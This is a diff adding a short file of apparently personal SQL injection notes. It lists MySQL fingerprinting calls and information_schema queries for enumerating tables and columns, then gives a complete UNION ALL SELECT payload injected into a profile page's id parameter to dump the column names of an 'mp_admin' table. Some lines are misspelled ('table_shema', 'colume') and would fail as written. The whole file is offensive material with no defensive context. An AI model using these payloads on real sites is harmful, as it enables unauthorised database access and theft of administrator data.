@@ -1,0 +1,19 @@
+@@version
+@@user
+user()
+database()
+
+concat(user(),database(),version())
+
+table_name
+
+from information_schema.tables where table_shema=database()
+
+group_concat(table_name)
+
+when colume name
+
+from information_schema.columns where column_name='users'
+
+
+domain.com/full-profile.php?id=L15139' +UNION+ALL+SELECT+1,2,3,4,23,24,25,26,27,group_concat(column_name,0x3c62723e,0x3c62723e),29,30,31 from information_schema.columns where table_name='mp_admin'-- -
